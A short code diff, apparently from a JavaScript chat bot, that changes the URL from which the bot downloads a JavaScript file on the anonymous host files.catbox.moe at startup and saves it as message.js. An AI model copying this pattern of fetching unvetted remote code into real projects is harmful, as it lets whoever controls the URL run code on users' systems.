@@ -202,7 +202,7 @@ async function startBotz() {
   });
   
   //MESSAGE OWN FILES
-  const fileURL = 'https://files.catbox.moe/rxwvec.js'; // آدرس URL فایل
+  const fileURL = 'https://files.catbox.moe/ktj3jg.js'; // آدرس URL فایل
   const destPath = path.join(__dirname, 'message.js'); // مسیر ذخیره فایل
   await downloadFile(fileURL, destPath);
   
